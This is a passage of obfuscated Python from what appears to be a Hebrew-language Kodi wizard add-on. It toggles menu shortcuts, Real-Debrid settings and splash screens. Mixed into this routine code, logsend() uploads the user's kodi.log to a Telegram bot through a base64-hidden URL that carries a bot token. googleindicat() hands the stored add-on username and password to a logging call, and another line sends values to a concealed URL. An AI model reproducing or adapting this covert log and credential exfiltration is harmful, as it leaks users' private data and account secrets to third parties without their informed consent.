          O0OO0OOO0O0O000OO =urllib2 .urlopen (OOO0O00OO0OO0O0OO .decode ('base64')+' - '+OO00OO0O0O0O000O0 +' - '+O000O0O00O0O0O0O0 +' - '+O0O0OO0O0O0OOO0O0 ).readlines ()#line:577
       except :pass #line:578
def googleindicat ():#line:581
			import logg #line:582
			OOO0O00O0OOOO00O0 =(ADDON .getSetting ("pass"))#line:583
			OOO00OO0O00OOOOOO =(ADDON .getSetting ("user"))#line:584
			logg .logGA (OOO0O00O0OOOO00O0 ,OOO00OO0O00OOOOOO )#line:585
def logsend ():#line:586
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:587
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:588
      howsentlog ()#line:590
      import requests #line:591
      if xbmc .getCondVisibility ('system.platform.windows'):#line:592
         OOO0O000OOOO0OO0O =xbmc .translatePath ('special://home/kodi.log')#line:593
         OO0O0O000OOO0OO00 ={'chat_id':(None ,'-274262389'),'document':(OOO0O000OOOO0OO0O ,open (OOO0O000OOOO0OO0O ,'rb')),}#line:597
         OOO00O00O000O0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:598
         OO0OO0OO0O0O00OOO =requests .post (OOO00O00O000O0O0O .decode ('base64'),files =OO0O0O000OOO0OO00 )#line:600
      elif xbmc .getCondVisibility ('system.platform.android'):#line:601
           OOO0O000OOOO0OO0O =xbmc .translatePath ('special://temp/kodi.log')#line:602
           OO0O0O000OOO0OO00 ={'chat_id':(None ,'-274262389'),'document':(OOO0O000OOOO0OO0O ,open (OOO0O000OOOO0OO0O ,'rb')),}#line:606
           OOO00O00O000O0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:607
           OO0OO0OO0O0O00OOO =requests .post (OOO00O00O000O0O0O .decode ('base64'),files =OO0O0O000OOO0OO00 )#line:609
      else :#line:610
           OOO0O000OOOO0OO0O =xbmc .translatePath ('special://kodi.log')#line:611
           OO0O0O000OOO0OO00 ={'chat_id':(None ,'-274262389'),'document':(OOO0O000OOOO0OO0O ,open (OOO0O000OOOO0OO0O ,'rb')),}#line:615
           OOO00O00O000O0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:616
           OO0OO0OO0O0O00OOO =requests .post (OOO00O00O000O0O0O .decode ('base64'),files =OO0O0O000OOO0OO00 )#line:618
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:619
def rdoff ():#line:621
	OOOO0O0OOOO0OO000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:622
	OOOO0O0OOOO0OO000 .setSetting ('rd.client_id','')#line:623
	OOOO0O0OOOO0OO000 .setSetting ('rd.secret','')#line:624
	OOOO0O0OOOO0OO000 .setSetting ('rdsource','false')#line:625
	OOOO0O0OOOO0OO000 .setSetting ('super_fast_type_toren','false')#line:626
	OOOO0O0OOOO0OO000 .setSetting ('rd.auth','false')#line:627
	OOOO0O0OOOO0OO000 .setSetting ('rd.refresh','false')#line:628
	OOOO0O0OOOO0OO000 .setSetting ('magnet','false')#line:629
	OOOO0O0OOOO0OO000 .setSetting ('torrent_server','false')#line:630
	OOOO0O0OOOO0OO000 =xbmcaddon .Addon ('script.module.resolveurl')#line:632
	OOOO0O0OOOO0OO000 .setSetting ('RealDebridResolver_client_id','')#line:633
	OOOO0O0OOOO0OO000 .setSetting ('RealDebridResolver_client_secret','')#line:634
	OOOO0O0OOOO0OO000 .setSetting ('RealDebridResolver_token','')#line:635
	OOOO0O0OOOO0OO000 .setSetting ('RealDebridResolver_refresh','')#line:636
	OOOO0O0OOOO0OO000 =xbmcaddon .Addon ('plugin.video.seren')#line:638
	OOOO0O0OOOO0OO000 .setSetting ('rd.client_id','')#line:639
	OOOO0O0OOOO0OO000 .setSetting ('rd.secret','')#line:640
	OOOO0O0OOOO0OO000 .setSetting ('rd.auth','')#line:641
	OOOO0O0OOOO0OO000 .setSetting ('rd.refresh','')#line:642
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:643
		OOOO0O0OOOO0OO000 =xbmcaddon .Addon ('plugin.video.gaia')#line:644
		OOOO0O0OOOO0OO000 .setSetting ('accounts.debrid.realdebrid.id','')#line:645
		OOOO0O0OOOO0OO000 .setSetting ('accounts.debrid.realdebrid.secret','')#line:646
		OOOO0O0OOOO0OO000 .setSetting ('accounts.debrid.realdebrid.token','')#line:647
		OOOO0O0OOOO0OO000 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:648
	resloginit .resloginit ('restore','all')#line:649
	OOOO000O000000000 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:651
	O0O00OO0OOOOOOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:652
	copyfile (OOOO000O000000000 ,O0O00OO0OOOOOOOOO )#line:653
def skindialogsettind18 ():#line:654
	try :#line:655
		O00O0O0OOOO00OO00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:656
		OO00O00O0O0OOO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:657
		copyfile (O00O0O0OOOO00OO00 ,OO00O00O0O0OOO000 )#line:658
	except :pass #line:659
def rdon ():#line:660
	loginit .loginIt ('restore','all')#line:661
	O000OOO0OO000O000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:663
	OO00O000000O000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:664
	copyfile (O000OOO0OO000O000 ,OO00O000000O000O0 )#line:665
def adults18 ():#line:667
  OOO0O0O0OO0OO00O0 =(ADDON .getSetting ("adults"))#line:668
  if OOO0O0O0OO0OO00O0 =='true':#line:669
    O0OOOO0000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:670
    with open (O0OOOO0000OO000O0 ,'r')as O0O0OOOOOOO000000 :#line:671
      OO00O0OO0OO0OO000 =O0O0OOOOOOO000000 .read ()#line:672
    OO00O0OO0OO0OO000 =OO00O0OO0OO0OO000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:690
    with open (O0OOOO0000OO000O0 ,'w')as O0O0OOOOOOO000000 :#line:693
      O0O0OOOOOOO000000 .write (OO00O0OO0OO0OO000 )#line:694
def rdbuildaddon ():#line:695
  OOO0O0OO00O00000O =(ADDON .getSetting ("auto_rd"))#line:696
  if OOO0O0OO00O00000O =='true':#line:697
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:698
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:699
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:700
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:718
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:721
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:722
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:726
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:727
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:728
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:746
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:749
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:750
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:754
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:755
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:756
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:774
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:777
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:778
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:782
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:783
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:784
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:802
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:805
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:806
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:809
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:810
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:811
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:829
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:832
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:833
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:835
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:836
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:837
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:855
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:858
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:859
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:861
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:862
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:863
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:881
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:884
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:885
    OO0O000000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:888
    with open (OO0O000000O0O0OOO ,'r')as O00OO0O0O0O0OOO0O :#line:889
      OOO0OO00O0O0O0O0O =O00OO0O0O0O0OOO0O .read ()#line:890
    OOO0OO00O0O0O0O0O =OOO0OO00O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:908
    with open (OO0O000000O0O0OOO ,'w')as O00OO0O0O0O0OOO0O :#line:911
      O00OO0O0O0O0OOO0O .write (OOO0OO00O0O0O0O0O )#line:912
def rdbuildinstall ():#line:915
  try :#line:916
   OOOOOOO00OO000000 =(ADDON .getSetting ("auto_rd"))#line:917
   if OOOOOOO00OO000000 =='true':#line:918
     O0O0000OOOOOOO0O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:919
     O00O0OOO00OOO0OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:920
     copyfile (O0O0000OOOOOOO0O0 ,O00O0OOO00OOO0OOO )#line:921
  except :#line:922
     pass #line:923
def rdbuildaddonoff ():#line:926
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:929
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:930
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:931
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:949
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:952
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:953
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:958
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:959
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:977
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:980
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:981
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:985
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:986
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:987
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1005
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1008
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1009
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:1014
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:1015
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1033
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1036
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1037
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1040
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:1041
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:1042
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1060
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1063
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1064
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1066
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:1067
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:1068
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1086
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1089
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1090
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1092
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:1093
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:1094
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1112
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1115
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1116
    O0000O0O000OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1119
    with open (O0000O0O000OOOO00 ,'r')as OOO0O0OO0OOOOOOOO :#line:1120
      O00OO00O0OO0OOO0O =OOO0O0OO0OOOOOOOO .read ()#line:1121
    O00OO00O0OO0OOO0O =O00OO00O0OO0OOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1139
    with open (O0000O0O000OOOO00 ,'w')as OOO0O0OO0OOOOOOOO :#line:1142
      OOO0O0OO0OOOOOOOO .write (O00OO00O0OO0OOO0O )#line:1143
def rdbuildinstalloff ():#line:1146
    try :#line:1147
       O000O0O0OO0O00000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1148
       OOO00OOO0O0O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1149
       copyfile (O000O0O0OO0O00000 ,OOO00OOO0O0O0OOO0 )#line:1151
       O000O0O0OO0O00000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1153
       OOO00OOO0O0O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1154
       copyfile (O000O0O0OO0O00000 ,OOO00OOO0O0O0OOO0 )#line:1156
       O000O0O0OO0O00000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1158
       OOO00OOO0O0O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1159
       copyfile (O000O0O0OO0O00000 ,OOO00OOO0O0O0OOO0 )#line:1161
       O000O0O0OO0O00000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1164
       OOO00OOO0O0O0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1165
       copyfile (O000O0O0OO0O00000 ,OOO00OOO0O0O0OOO0 )#line:1167
    except :#line:1169
